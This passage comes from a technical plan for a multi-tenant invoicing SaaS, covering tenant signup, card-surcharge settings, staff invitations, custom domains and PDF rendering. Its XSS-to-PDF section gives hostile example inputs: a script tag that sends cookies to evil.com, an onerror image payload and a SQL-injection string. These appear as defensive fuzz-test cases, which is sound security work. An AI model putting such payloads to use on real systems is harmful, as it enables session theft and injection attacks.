4. Read tenant meta for `stripeAccountId`, `chargeCustomerCardFees`, `cardFeePercent`, `currency`.
5. Build the Checkout session with the surcharge logic above.
6. Return `{ url: session.url }` — client redirects.

The function is rate-limited (Cloud Functions v2 `maxInstances: 10`, `cpu: 1`) and uses `PAY_TOKEN_SECRET` from `defineSecret()` — never an env var. Logged attempts include token hash (not the token itself), invoice ID, and outcome. Sentry tags the invoice's `tenantId`.

**Estimated effort:** 4–6 days. Budget an extra day for Stripe docs reading and end-to-end testing.

---

## Phase 5 — Tenant Onboarding Flow

### Signup flow (transactional)

**⚠️ `onSignup` MUST be a callable Cloud Function (`onCall`), NOT an Auth `onCreate` trigger.**

Why: If `onSignup` were an `onCreate` trigger, it would fire asynchronously when `createUserWithEmailAndPassword()` completes. The client would have no way to know when the trigger has finished setting custom claims. Calling `getIdToken(true)` immediately after `createUser...` would race against the trigger — sometimes claims are set, sometimes they aren't. The signup flow would fail intermittently and be impossible to debug.

With a callable function, the client explicitly calls `onSignup({ businessName, ... })` and **awaits the response**. Only after the callable returns does the client call `getIdToken(true)`. No race condition.

**Client-side signup flow:**
```typescript
// 1. Create Firebase Auth user (client SDK)
const { user } = await createUserWithEmailAndPassword(auth, email, password);
// 2. Call onSignup callable — AWAIT it
await httpsCallable(functions, 'onSignup')({ businessName, ... });
// 3. NOW force token refresh — claims are guaranteed to be set
await user.getIdToken(true);
// 4. Safe to redirect
router.push('/dashboard');
```

**tenantId generation (C4 fix from round 3 audit):**

`tenantId` is a slug derived from the business name with a numeric collision suffix. Generated server-side inside a transaction so two simultaneous signups with the same business name can't both grab the same ID. Done BEFORE the batched write below.

```typescript
async function generateTenantId(businessName: string): Promise<string> {
  const base = businessName.toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 40) || 'tenant';

  return await db.runTransaction(async (tx) => {
    for (let suffix = 0; suffix < 100; suffix++) {
      const candidate = suffix === 0 ? base : `${base}-${suffix}`;
      const ref = db.doc(`tenants/${candidate}/meta`);
      const snap = await tx.get(ref);
      if (!snap.exists) return candidate;
    }
    throw new HttpsError('resource-exhausted', 'Could not generate tenant ID');
  });
}

// In onSignup:
const newTenantId = await generateTenantId(businessName);
```

This produces stable, human-readable IDs (`smith-plumbing`, `smith-plumbing-1`, `smith-plumbing-2`) that show up in Firestore paths, Stripe metadata, Sentry tags, and support conversations. Random UUIDs would work too but make debugging painful.

**Server-side `onSignup` callable** then creates the tenant docs in one batched write:

```typescript
// 1. Firebase Auth user already exists (created by client SDK above)
// 2. Generate tenantId (above) — wrapped in its own transaction
// 3. Set custom claims
await admin.auth().setCustomUserClaims(uid, { tenantId: newTenantId, role: 'owner' });
// ⚠️ Claims are set server-side but the client's current token is STALE.
// The client MUST call user.getIdToken(true) after this callable returns.
// See "Firebase Auth custom claims propagation delay" in Phase 3.

// 3. Firestore docs
const batch = db.batch();
batch.set(db.doc(`tenants/${newTenantId}/meta`), {
  name: businessName,
  logoUrl: null,
  address: '',
  primaryColor: '#667eea',           // sensible default
  secondaryColor: '#764ba2',         // sensible default
  fontFamily: 'Inter',               // sensible default
  faviconUrl: null,
  customDomain: null,                // configured later in /settings
  customDomainStatus: null,          // populated by setupCustomDomain when a domain is added
  // ⚠️ These six fields are also part of the meta schema and MUST be
  // initialized here. If any are omitted, the FIRST invoice's tenantSnapshot
  // will embed `undefined` values → PDF renders with missing tax line,
  // HST math fails, currency formatting crashes. This is the #1 most
  // expensive-to-debug bug in the whole plan. Do not remove these defaults.
  taxRate: 0.13,                     // Ontario HST — tenant can change in /settings
  taxName: 'HST',                    // tenant can change in /settings
  businessNumber: '',                // empty string, not null — PDF string templates
  invoicePrefix: 'INV',              // tenant can change in /settings
  emailFooter: '',                   // empty string, tenant can add in /settings
  currency: 'CAD',                   // ISO 4217, tenant can change in /settings
  stripeAccountId: null,
  stripeStatus: {                    // R1 — preflight + banner source of truth.
    chargesEnabled: false,           // Flipped true only by `account.updated` webhook
    payoutsEnabled: false,           // after tenant completes Connect onboarding.
    detailsSubmitted: false,         // payInvoice reads chargesEnabled; dashboard banner
    currentlyDue: [],                // reads disabledReason + currentlyDue.
    disabledReason: null,
    updatedAt: serverTimestamp(),
  },
  etransferEmail: null,              // configured in /settings before first send
  chargeCustomerCardFees: false,
  cardFeePercent: 2.4,
  surchargeAcknowledgedAt: null,
  deletedAt: null,                   // soft-delete marker
  createdAt: serverTimestamp(),
});
batch.set(db.doc(`tenants/${newTenantId}/entitlements`), {
  plan: 'free',
  features: {
    invoices: true,
    customers: true,
    // everything else inherits false from DEFAULT_FEATURES
  },
  limits: { maxInvoicesPerMonth: 10 },
  updatedAt: serverTimestamp(),
});
batch.set(db.doc(`users/${uid}`), {
  primaryTenantId: newTenantId,            // active tenant for the user's current ID token
  email: String(userEmail).toLowerCase(),  // C2 — lowercase at write boundary
});
// Membership record — MVP writes one per user, but the collection exists from
// day one so post-MVP multi-tenant access (bookkeepers/VAs) is a UI change,
// not a schema migration. See P7 in DEFERRED and `userTenantMemberships` in
// the Phase 1 schema block.
batch.set(db.doc(`userTenantMemberships/${uid}_${newTenantId}`), {
  uid,
  tenantId: newTenantId,
  role: 'owner',
  invitedBy: null,
  createdAt: serverTimestamp(),
  deletedAt: null,
});
// C5 fix from round 3 audit — initialize counters in the same batch.
// Without this, the first consumeInvoiceNumber() / consumeQuoteNumber()
// transaction reads a non-existent doc and crashes (or has to lazy-init,
// which is an extra branch nobody remembers to write correctly).
batch.set(db.doc(`tenants/${newTenantId}/counters/invoiceCounter`), {
  count: 0,
  createdAt: serverTimestamp(),
});
batch.set(db.doc(`tenants/${newTenantId}/counters/quoteCounter`), {
  count: 0,
  createdAt: serverTimestamp(),
});
await batch.commit();
```

### Settings page (`/settings`)
- Edit business name, address, email-from
- Edit branding: primaryColor, secondaryColor, fontFamily picker, favicon upload
- **Contrast guard on color pickers** — primaryColor and secondaryColor inputs run `meetsWcagAA(hex, '#FFFFFF')` on change; if the ratio is below 4.5:1, show inline error "This color is too light — button text won't be readable. Try a darker shade." Save button stays disabled until valid. `updateTenantBranding` callable re-validates server-side.
- Logo upload → Firebase Storage at `tenants/{tenantId}/logo.png` (Storage rules mirror Firestore).
  **⚠️ After upload, call `getDownloadURL(ref)` and store the returned public https URL in `meta.logoUrl` — NOT the Storage path.** The token-bearing download URL is what's publicly fetchable; the raw Storage path (e.g. `tenants/acme/logo.png`) requires authenticated Storage access, which customers and the PDF renderer don't have. Same rule for `favicon.ico` → `meta.faviconUrl`.
- Favicon upload → Firebase Storage at `tenants/{tenantId}/favicon.ico` (see getDownloadURL note above)
- Show current plan (read-only), button to contact for upgrade (manual for MVP)

### Payment settings (`/settings/payments`)

Dedicated sub-page for everything payment-related. Separate from the main settings page because it has compliance implications (surcharging) and enough controls to warrant its own surface.

**Fields and controls:**

1. **Interac e-Transfer email** — single text input, validated as email format. Written to `meta.etransferEmail`. This is what customers see as the e-transfer destination on the pay page and in the PDF. If blank, e-transfer is hidden from customer-facing surfaces. Includes hint: "Most contractors use the same email where they want the money deposited. This is shown to customers on every invoice."

2. **Credit card surcharge toggle** — boolean switch bound to `meta.chargeCustomerCardFees`. Off by default. Toggling ON triggers the acknowledgment modal (below) on first enable only; subsequent toggles don't re-show the modal because `surchargeAcknowledgedAt` is already set.

3. **Surcharge percentage** — number input, disabled if toggle is off. Default 2.4, max 2.4 (enforced client-side with HTML `max` attribute AND server-side in `updatePaymentSettings` callable — belt and suspenders). Hint below: "Visa and Mastercard Canada cap surcharges at 2.4%. You cannot charge more even if you want to."

4. **Preview row (R5 — honest 3-row net breakdown).** A live-updating calculation table showing what ACTUALLY happens on a typical $500 invoice. Surcharging does NOT eliminate processing fees — it reduces them. Tenants need to see the real math or they will feel deceived at their first Stripe payout.

   ```
   On a $500 invoice paid by credit card:
   ─────────────────────────────────────────────────────────
   Customer pays                          $512.00
   Stripe fee (2.9% + $0.30)             −$15.15
   ─────────────────────────────────────────────────────────
   You receive (net)                      $496.85
   Without surcharge you'd receive:       $484.55
   Surcharging saves you:                 +$12.30 per invoice
   ```

   Reasoning surfaced to the tenant in small text below: "The 2.4% cap is set by Visa and Mastercard — you can't charge more. Stripe's actual cost is 2.9% + 30¢, so you'll still absorb roughly 0.5% + 30¢ per transaction. Surcharging passes most of the cost to customers, but not all of it."

   The e-transfer row stays simple: "E-transfer — customer pays $500, you receive $500, no fees." This is the honest comparison that makes e-transfer-first layout make sense.

**Surcharge acknowledgment modal (one-time, on first toggle ON):**

Rendered with shadcn `<AlertDialog>`. Content:

> **Before you enable credit card surcharging**
>
> Canadian card-network rules require that you:
>
> 1. **Notify Visa and Mastercard 30 days before surcharging begins.** Forms are on their respective websites (linked below). This is required — not optional. Our platform cannot do this on your behalf.
>    - [Visa Canada merchant surcharge notification](https://www.visa.ca/) (link to be verified)
>    - [Mastercard Canada merchant surcharge notification](https://www.mastercard.ca/) (link to be verified)
>
> 2. **Do not surcharge Quebec customers.** Quebec's Consumer Protection Act prohibits credit card surcharges. If you serve Quebec residents, you must leave this setting off, or manually disable it for those specific invoices.
>
> 3. **Do not surcharge debit card payments.** Our platform cannot fully distinguish debit from credit Visa/Mastercard at checkout. If this becomes a compliance concern, contact support.
>
> 4. **Surcharges are capped at 2.4%** — the Canadian network ceiling. We enforce this cap automatically.
>
> 5. **The surcharge must be disclosed before the customer pays.** Our platform handles this automatically — the pay page shows "+ X% processing fee" next to the credit card option, and the PDF invoice shows the surcharge as a separate line when paid by card.
>
> ☐ **I confirm I have notified Visa and Mastercard and understand the Quebec and debit-card restrictions.**
>
> [ Cancel ] [ Enable surcharging ]

Checkbox must be checked before "Enable surcharging" is clickable. On confirm, `updatePaymentSettings` is called with `chargeCustomerCardFees: true` AND `surchargeAcknowledgedAt: serverTimestamp()`. The server-side callable refuses to set `chargeCustomerCardFees: true` if `surchargeAcknowledgedAt` would still be null after the update (defensive — can't bypass the modal by hitting the API directly).

**Why this matters legally:**

The platform (TechFlow) is not a payment processor — Stripe is. But if a tenant gets audited by Visa/Mastercard for undisclosed surcharging, the platform's defense is "we disclosed the rules, required acknowledgment, and enforced the 2.4% cap." The `surchargeAcknowledgedAt` timestamp is the audit trail. Log it immutably (serverTimestamp, never client-writable).

**Why link verification is deferred:**

The Visa/Mastercard merchant-surcharge notification URLs change periodically. Phase 5 implementer should verify the current URLs at build time and update the modal copy. If the links 404 at any point, the modal should fall back to "Search for 'merchant surcharge notification' on visa.ca and mastercard.ca" — the *requirement* to notify doesn't change even if the URLs do.

### Staff invitation flow
The signup flow only creates the *first* user (the owner) for a tenant. Any subsequent staff (office manager, second technician, bookkeeper) must be invited through a separate flow that never exposes the tenant to the public signup page.

**Why a dedicated flow (not "second user signs up and picks a tenant"):**
- A public "join existing tenant" signup would let anyone claim to be part of Smith Plumbing. Token-gated invitations are the only safe pattern.
- Firebase custom claims can't be set by a client — only Admin SDK. So acceptance has to go through a callable Cloud Function that verifies the token, then sets the correct `tenantId`/`role` claims on the accepting user.

**Data model:** `tenants/{tenantId}/invitations/{inviteId}` — schema defined in Phase 1 Firestore structure. Token is hashed (SHA-256) before storage; the raw token is only in the invite email.

**Flow:**
1. Owner/admin on `/settings/team` enters `email` + `role` (`admin` | `member`), clicks Invite.
2. Client calls `createInvitation` callable with `{ email, role }`. Function requires caller to have `role in ['owner', 'admin']` on the target tenant.
3. Function generates a random token (32 bytes, base64url), hashes it, writes `invitations/{inviteId}` with `{ email, role, token: hash, invitedBy: callerUid, createdAt, expiresAt: now + 7 days, acceptedAt: null }`.
4. Function sends invite email containing `https://<portal-domain>/portal/accept-invite?tenantId={tenantId}&inviteId={inviteId}&token={rawToken}` (via Resend — see email provider decision in Decisions Required section).
5. Invitee clicks link. If not signed in, they either sign in (existing Firebase account matching the invite email) or sign up with a password. **The email on their Firebase account MUST match the invite's `email` field** — the accept function verifies this to prevent invite theft.
6. Client calls `onAcceptInvite({ tenantId, inviteId, token })`. Function:
   - Loads the invite doc, checks `acceptedAt == null` and `expiresAt > now`.
   - Hashes the supplied token and compares to stored hash.
   - Verifies `request.auth.token.email == invite.email` and `email_verified == true`.
   - Calls `admin.auth().setCustomUserClaims(uid, { tenantId, role })`.
   - Creates (or updates) `users/{uid}` with `{ primaryTenantId: tenantId, email }`.
   - Creates `userTenantMemberships/${uid}_${tenantId}` with `{ uid, tenantId, role, invitedBy: invite.invitedBy, createdAt, deletedAt: null }`. Post-MVP multi-tenant UI will let users switch `primaryTenantId` between memberships.
   - Marks invite `acceptedAt = serverTimestamp()`.
7. Client calls `user.getIdToken(true)` to refresh claims (same propagation-delay fix as signup), then redirects to `/dashboard`.

**Revocation:** owner/admin can delete the invite doc before it's accepted. After acceptance, they use `setUserRole` or disable the user in Firebase Auth.

**Edge cases:**
- Invitee already has a Firebase account belonging to a different tenant → MVP still rejects at `onAcceptInvite` (one *active* tenant per user for MVP; the JWT claim can only point at one). The schema supports multi-tenant memberships from day one, so post-MVP this rejection is lifted and becomes a "switch active tenant" UI — no migration needed.
- Invite email bounces → owner sees "not yet accepted" in `/settings/team`, can resend or revoke.
- Token leaked from email → 7-day expiry + one-time use (`acceptedAt` check) limits blast radius.

### Custom domain support
Two domain tiers per tenant:
1. **Generic (immediate):** `portal.techflowsolutions.ca` — works out of the box, no DNS needed. Tenant resolved via auth claims after login.
2. **Custom (configured):** e.g. `invoices.smithplumbing.ca` — client points DNS (CNAME to `cname.vercel-dns.com`), Vercel handles SSL automatically.

**Implementation:**

- **`customDomain` field in tenant meta.** Set by Reggie (platform admin) during onboarding or by tenant in `/settings` (if on a plan that includes custom domains — feature-gated via `entitlements`).
- **`customDomains/{domain}` Firestore collection.** Reverse lookup: `domain → tenantId`. Written by a Cloud Function triggered on meta update (when `customDomain` changes). This collection is what the middleware queries.
- **Vercel domain provisioning.** Cloud Function calls the [Vercel Domains API](https://vercel.com/docs/rest-api/endpoints/domains) to add/remove the domain from the Vercel project when `customDomain` is set/changed.
- **Next.js middleware** (`middleware.ts`):
  1. On every request, read `Host` header.
  2. If host is not `portal.techflowsolutions.ca` (the generic domain), query `customDomains/{host}` to get `tenantId`.
  3. If found, inject `tenantId` into request headers / cookies so the login page and portal can load that tenant's branding.
  4. If not found, 404.

  **R3 — `config.matcher` MUST exclude static assets and API routes:**
  ```typescript
  export const config = {
    matcher: [
      // Run middleware on all paths EXCEPT:
      // - _next/static (Next.js static files)
      // - _next/image (image optimization)
      // - favicon.ico, robots.txt, sitemap.xml
      // - api/* (API routes authenticate via Authorization header, not host-based tenant resolution)
      // - any file extension (fonts, images, CSS, etc.)
      '/((?!_next/static|_next/image|favicon.ico|robots.txt|sitemap.xml|api/|.*\\..*).*)',
    ],
  };
  ```
  Without this matcher, middleware fires on every static asset request (every image, CSS file, font, favicon) — at 50 tenants on custom domains, a single page view triggers 20+ Firestore reads just for middleware resolution. With the matcher, middleware only runs on actual HTML page requests (~1 read per page view). Rough math: 50 tenants × 1000 daily visitors × 20 assets = 1M unnecessary Firestore reads/day without this. Cost-wise ~$6/day, latency-wise 50–200ms added to every asset load. The matcher is the single biggest scale optimization in the middleware spec.

  **⚠️ Edge runtime vs Node.js runtime — architectural choice required before Phase 5.**
  Next.js middleware runs on the **Edge runtime by default**, which is a lightweight V8 environment with **no Node.js APIs**. The Firebase Admin SDK depends on Node.js (`fs`, `crypto`, `net`) and **will not run in Edge middleware**. If middleware is written assuming `firebase-admin`, the first request after deploy fails with a cryptic `Module not found` or `Cannot read properties of undefined`.

  Three valid options — pick one before writing the middleware:
  1. **Force Node.js runtime:** add `export const config = { runtime: 'nodejs' };` to `middleware.ts`. Slower cold start, higher cost per request, but Firebase Admin SDK works. Acceptable at 50-tenant scale.
  2. **Use Firestore REST API directly from Edge:** `fetch('https://firestore.googleapis.com/v1/projects/.../documents/customDomains/...')` with a service-account OAuth token. Keeps Edge performance but you write the REST calls and token minting by hand.
  3. **Cache `customDomains` in Vercel Edge Config or KV:** write to Edge Config from the Cloud Function that manages custom domains, read from Edge Config in middleware. Fastest at request time, eventual-consistency lag when a domain is added/removed.

  **Recommendation:** Option 1 (Node.js runtime) for MVP — simplest, one line of config, one lookup path. Revisit if middleware latency becomes noticeable.

  **⚠️ Cache the domain lookup — Firestore read per request is not acceptable at scale.**
  Even with Node.js runtime and the `config.matcher` above, the naive implementation runs one Firestore read per HTML page view per custom domain. Cold-path Firestore reads are 100–300ms — that's latency a user feels before the login page starts rendering. At 50 tenants × 1000 page views/day, it's also ~50k Firestore reads/day purely for domain resolution, when the data changes maybe once a month.

  **Required — Vercel Edge Config as the authoritative lookup, Firestore as the write-side source:**
  1. The `setupCustomDomain` Cloud Function (the same one that manages Vercel Domains API + Firebase authorized domains) also writes `{ [domain]: tenantId }` to Vercel Edge Config via the Edge Config API.
  2. Middleware reads from Edge Config (`get(host)` from `@vercel/edge-config`) — sub-50ms globally replicated, no Firestore read on the hot path.
  3. Firestore `customDomains/{domain}` remains the durable source of truth (for audit + recovery if Edge Config is ever inconsistent), and is what the Cloud Function updates first.
  4. Eventual-consistency lag (~seconds) between "tenant saves custom domain" and "domain resolves in middleware" is acceptable — adding a custom domain is already a multi-minute DNS propagation operation; a few seconds of cache lag is invisible.
  5. Miss path: if Edge Config returns nothing, fall back to a single Firestore read and **re-populate Edge Config on the spot** so only the first request pays the cost.

  This is Phase 5 scope, not a later optimization — building the middleware without it means ripping it out and redoing it under load.

- **Branded login page.** The `/portal/login` route reads the resolved `tenantId` (from middleware), fetches `tenants/{tenantId}/meta` (public-read subset: name, logoUrl, primaryColor, secondaryColor, fontFamily, faviconUrl), and renders the login page with the tenant's branding. The customer sees "Smith Plumbing" on the login screen, not "TechFlow."

  **⚠️ This fetch MUST be server-side via Firebase Admin SDK — never client-side.**
  A visitor to the login page is unauthenticated. The Firestore rule `allow read: if request.auth.token.tenantId == tenantId` blocks unauthenticated reads of `meta`. A client-side `getDoc()` call returns permission-denied, the login page renders with no branding (or crashes), and the whole bundled-offering value prop breaks on the first customer load.

  Correct implementation: make `/portal/login` a **React Server Component** (or use `getServerSideProps` if using the pages router — but we're on App Router). In the server component, read the resolved `tenantId` from the middleware-injected header, then call `adminDb.doc(\`tenants/${tenantId}/meta\`).get()` using the Admin SDK (which bypasses rules because it runs with service-account credentials). Pass the branding values as props to the client-side login form.

  Do NOT add a "public read" branch to the Firestore rules for `meta` to work around this. That leaks every tenant's branding + address + business number to anyone who can guess a tenantId. Keep rules strict; use Admin SDK on the server for legitimate public-facing reads.
- **Firebase Auth authorized domains (automated).** Each custom domain must be added to Firebase Auth's authorized domains list for magic-link redirects to work. **This MUST be automated** — at 50 clients, manual addition is not viable. The same Cloud Function that calls the Vercel Domains API must also call the Firebase Auth Admin SDK (`admin.auth().projectConfigManager().updateProjectConfig()` or the Identity Toolkit REST API) to add the domain to the authorized list. When a custom domain is removed, the function must also remove it from the authorized domains list. This is a single Cloud Function that does four things atomically: (1) add/remove Vercel domain, (2) add/remove Firebase Auth authorized domain, (3) write/delete `customDomains/{domain}` doc, (4) write/delete the `{ [domain]: tenantId }` entry in Vercel Edge Config for middleware caching.

- **Domain verification state surfaced in `/settings/domain`.** Adding a custom domain isn't instant — DNS propagation (5 min to 48 hrs) and SSL issuance (Vercel's Let's Encrypt flow, usually <10 min but sometimes longer) each have their own state. If we don't show this, contractors enter a domain, see "saved," and then email support when it doesn't work an hour later.
  - Store `customDomainStatus` in tenant meta: `{ stage: 'pending-dns' | 'pending-ssl' | 'verified' | 'error', message, checkedAt }`.
  - The `setupCustomDomain` Cloud Function polls the Vercel Domains API (`GET /v10/domains/{domain}/config` + `GET /v9/projects/{id}/domains/{domain}`) for `verified` + `verification` records, and updates `customDomainStatus` as the state changes. A scheduled function re-checks every 5 minutes while `stage !== 'verified'`.
  - `/settings/domain` UI shows the current stage with a banner: DNS records the tenant needs to add (pulled from Vercel's `verification` field), current status, last-checked timestamp, and a "re-check now" button.
  - Until `stage === 'verified'`, the portal at the custom domain is not reachable, but the generic `portal.techflowsolutions.ca` still works. Outgoing invoice emails should keep linking to the generic domain until verification completes (don't send customers to a broken URL).

**Estimated effort:** 2–3 days on top of the base Phase 5 onboarding flow.

### Platform admin tooling (MVP)
- **No admin UI initially.** Reggie flips feature flags and changes plans by editing Firestore directly via the Firebase console.
- Proper admin UI is a later feature, not blocking launch.

**Estimated effort:** 2–3 days

---

## Phase 6 — PDF Generation

PDF rendering runs on the dedicated **Cloud Run** `pdf-service` microservice — see "PDF Generation Strategy" section above for rationale and service shape. Phase 6 covers the Next.js-side proxy routes and the Cloud Run service port from the old repo.

### Architecture (recap)

```
Customer / Contractor
       ↓
Next.js  /api/pdf/invoice  (Vercel)
   - verifies Firebase ID token (dual auth)
   - feature gate check
   - loads invoice doc + tenantSnapshot
   - POSTs { snapshot, data } + X-Api-Key
       ↓
Cloud Run  pdf-service
   - validates X-Api-Key
   - renders HTML via Puppeteer + full Chrome
   - returns PDF bytes
       ↓
Streamed back through Next.js to the caller
```

### Next.js proxy route (`/api/pdf/invoice/route.ts`)

- Accepts invoice ID + tenant ID (tenant ID because invoices are nested under `tenants/{tenantId}/invoices/{id}` and the ID alone is ambiguous) + Firebase ID token in `Authorization: Bearer <token>` header
- Verifies token server-side via `firebase-admin`
- **Dual auth pattern (two branches):**
  - **Tenant user path:** Token has `tenantId` claim → verify `tenantId` matches the invoice's parent tenant path. Contractor previewing/downloading their own invoice.
  - **Customer path:** Token has NO `tenantId` claim but has `email_verified: true` → verify token email matches the invoice's `customer.email`. End-customer downloading from the portal.
  - If neither branch matches → 403.
- Checks `invoices` feature is enabled for the invoice's tenant (read from `entitlements`)
- Loads the invoice doc, extracts `tenantSnapshot`
- POSTs `{ snapshot, data }` to `${PDF_SERVICE_URL}/render/invoice` with `X-Api-Key: ${PDF_SERVICE_API_KEY}`
- Streams the PDF response back to the caller

**Key detail:** the proxy route is the security boundary. Cloud Run trusts what the proxy sent. Do NOT forward the raw Firebase ID token to Cloud Run — the proxy has already validated it.

### Cloud Run `pdf-service` (ported from old repo)

- **Reads branding from the `tenantSnapshot` passed in by the proxy — NOT from Firestore.** This is critical: the Phase 0 decision locks invoices as frozen legal documents. A contractor who rebranded after sending this invoice must not have the PDF retroactively change. The snapshot contains: name, logoUrl, address, primaryColor, secondaryColor, fontFamily, faviconUrl, taxRate, taxName, businessNumber, emailFooter, currency. Cloud Run also never reads Firestore — it's a pure render service.
- Renders an HTML template with Tailwind-compiled CSS inline, using snapshot values
- Returns PDF bytes

### ⚠️ XSS-to-PDF — every user-controlled string must be HTML-escaped before rendering

Puppeteer renders a real Chromium instance. If the tenant's `businessName` is `<script>fetch('//evil.com?'+document.cookie)</script>` or a line-item description contains `<img src=x onerror="…">`, that executes inside our headless Chrome process running on Cloud Run. The attacker gets:
- Script execution inside the PDF render environment (can hit internal URLs, exfiltrate anything in memory).
- Persistent payload: the rendered bytes get saved as the invoice PDF and re-served to customers — the exploit now runs in any PDF viewer that executes JavaScript (some do).
- A path to embed arbitrary hyperlinks in the PDF that look legitimate ("Click to pay" → phishing site).

**Mandatory rules — no exceptions:**

1. **Every interpolation into HTML must go through an escape function.** Use a template engine that auto-escapes by default — recommended: **Handlebars** (`{{ name }}` escapes, `{{{ name }}}` does not and is banned in the codebase). Or use React's `renderToStaticMarkup` (auto-escapes). Do NOT use string concatenation or template literals with raw values for any user-controlled field.

2. **Apply to every `tenantSnapshot` field AND every invoice/customer field.** Specifically: `tenantSnapshot.name`, `tenantSnapshot.address`, `tenantSnapshot.businessNumber`, `tenantSnapshot.emailFooter`, `customer.name`, `customer.address`, `customer.email`, every line-item `description` and `notes`, `invoice.notes`, any custom field. Assume every string in the payload is attacker-controlled — an owner account can compromise themselves only, but a compromised owner can compromise their own customers via the PDF.

3. **Logo URL: validate before embedding.** The `<img src="{{ logoUrl }}">` attribute is still an injection vector even with Handlebars escaping (because `javascript:` URLs aren't HTML-escaped — they're URL-escaped differently). Require `logoUrl` to start with `https://` at validation time, reject anything else. Better: inline the logo as base64 (see "Immutable logo snapshot" below) so this vector disappears entirely.

4. **CSP on the Cloud Run render.** The Express app should serve the render HTML with `Content-Security-Policy: default-src 'none'; img-src data: https:; style-src 'unsafe-inline'; font-src data: https:;`. Blocks any injected `<script>` from executing even if the escape is bypassed. Defense in depth — belt + suspenders.

5. **Fuzz test the render with hostile inputs before first real send.** Part of Phase 7 test matrix: create an invoice with `businessName = '<script>alert(1)</script>'`, line item with `description = '"><img src=x onerror=alert(1)>'`, customer name with `'; DROP TABLE--`. Render the PDF. Confirm: (a) no script execution in Cloud Run logs, (b) the rendered text shows the literal characters, (c) no broken layout.

This is the highest-severity finding in the entire audit. A successful XSS-to-PDF chain on a pre-launch SaaS is a reputation kill before the first real customer.

### Immutable logo snapshot — protect historical PDFs from "zombie" URLs

The `tenantSnapshot.logoUrl` stored on an invoice is a token-bearing Firebase Storage download URL. That URL stays valid only as long as the underlying object exists in Storage. If a tenant rebrands and deletes their old logo file to clean up Storage, every historical invoice PDF that still references the old URL now renders with a broken-image icon. Same failure mode if a tenant rotates the download token (admin SDK `getDownloadURL()` with a new token invalidates the old one).

This violates the "frozen legal document" guarantee — same category of bug as changing the tax rate on an old invoice.

**Fix — inline the logo into the snapshot at invoice/quote creation time.**

Two equivalent implementations; pick one, apply consistently:

**Option A (recommended) — base64 data URL at snapshot time.**
In `createInvoice` (and `createQuote`), after loading `meta.logoUrl`:
```typescript
// Fetch the bytes once, convert to data URL, store on the snapshot.
const logoRes = await fetch(meta.logoUrl);
if (!logoRes.ok) throw new HttpsError('failed-precondition', 'Tenant logo is unreachable. Re-upload the logo in settings before sending invoices.');
const logoBytes = Buffer.from(await logoRes.arrayBuffer());
const logoMime = logoRes.headers.get('content-type') ?? 'image/png';
const logoDataUrl = `data:${logoMime};base64,${logoBytes.toString('base64')}`;

// Size sanity: reject logos over 500KB — a 500KB image is already unreasonable for an invoice header, and embedding 5MB+ into every invoice doc blows past Firestore's 1MB doc limit.
if (logoBytes.length > 500 * 1024) throw new HttpsError('failed-precondition', 'Logo exceeds 500KB. Re-upload a smaller version in settings.');

// Write to snapshot.
tenantSnapshot.logo = logoDataUrl;  // new field; legacy `logoUrl` can remain null or be dropped
```
Pros: invoices become fully self-contained; Storage file can be deleted with no downstream effect; PDF renders without a network fetch. Cons: invoice docs grow by 50–200KB per logo; the logo bytes are duplicated across every invoice the tenant has ever created (acceptable tradeoff for legal-document frozenness).

**Option B — copy the logo to an immutable Storage path at snapshot time.**
`createInvoice` copies `meta.logoUrl`'s bytes to `tenants/{tenantId}/snapshots/invoices/{invoiceId}/logo.{ext}` using the Admin SDK, generates a download URL for the immutable copy, stores that URL in `tenantSnapshot.logoUrl`. Storage rules block deletes of paths under `snapshots/**` except by platform admin.

Pros: doc size stays small. Cons: an extra Storage object per invoice; Storage bill grows linearly with invoice count; deletion guard must be enforced via rules *and* retained during any future cleanup jobs.

**Which to use:** Option A for MVP. Doc-size growth is bounded (500KB cap), and "fully self-contained invoice" matches the frozen-document mental model better than "the doc points at a file we promised not to delete."

Either way, the `tenantSnapshot.logoUrl` stored *must not* be a mutable Firebase Storage download URL of the tenant's current-logo file. That rule is now part of the `createInvoice`/`createQuote` spec.

### Porting checklist (from old Vite repo's Cloud Run service)

1. Copy the existing `pdf-service/` directory into the new monorepo (or keep it in a separate repo — either works for Cloud Run).
2. Update the HTML template to read from `tenantSnapshot` fields (new: `primaryColor`, `secondaryColor`, `fontFamily`, `faviconUrl`, `currency`, `emailFooter`). Old template only knew about `name`, `logo`, `address`, `taxRate`.
3. Rename `logo` → `logoUrl` in the template (matches new meta field).
4. Add `X-Api-Key` header check at the Express middleware level. Reject missing/wrong key with 401.
5. Remove any Firebase Admin SDK or Firestore code from Cloud Run (it's not needed — proxy sends all data).
6. Redeploy under three new service names: `pdf-service-dev`, `pdf-service-staging`, `pdf-service-prod`.

### Per-tenant branding in PDFs
HTML template reads from the **invoice's `tenantSnapshot`** (frozen at creation time):
- Logo (from `tenantSnapshot.logoUrl` — the public Firebase Storage download URL, or base64-inlined)
- Business name in header
- Address in footer
- primaryColor, secondaryColor for accent styling (used sparingly — see design rules below)
- fontFamily for text rendering
- taxRate, taxName, businessNumber for tax line items

### PDF design rules (the "polished and professional" target)

The PDF is the document customers save, print, and forward to their accountant. It must look like Stripe/QuickBooks/FreshBooks output — not like a tenant's MS Word template.

1. **Black text on white background, always.** No colored body text, no colored table rows.
2. **Brand color used sparingly:** header band behind the logo, the "Total" amount, and one horizontal rule below the header. That's it. Stripe and QuickBooks invoices are almost entirely black-and-white with a single accent color — that restraint is what "premium" reads as.
3. **Single-page for typical invoices.** Paginate cleanly for long line-item lists, with the header (logo + invoice number) repeated on each page and "Page X of Y" in the footer.
4. **Monospace font for amounts.** Right-aligned. Fixed decimal places. Makes totals scannable.
5. **Alternating row shading on the line-item table** at ~3% gray. Subtle, not loud.
6. **Tenant `fontFamily` applies to body text** on customer-facing surfaces (PDF, portal). Admin dashboard stays on Inter — decision from Phase 1.5.

### Payment methods block (bottom of PDF, above the footer)

Every invoice PDF includes a "How to pay" block with both methods, in this order (matching the pay page ordering):

```
────────────────────────────────────────────────
How to pay

1. Interac e-Transfer (preferred — no fees)
   Send to: invoices@acmeplumbing.com
   Memo:    INV-0042
   Note: Most Canadian banks cap e-Transfers at $3,000
   per transaction — request a limit increase from your
   bank if needed, or use the credit card option below.

2. Credit card
   Scan the QR code or visit:
   https://pay.acmeplumbing.com/pay/{shortened-token}

   [QR code rendering of pay URL, ~120×120px]

   ⓘ A 2.4% processing fee applies to credit card
     payments. (Only shown when chargeCustomerCardFees === true.)
────────────────────────────────────────────────
```

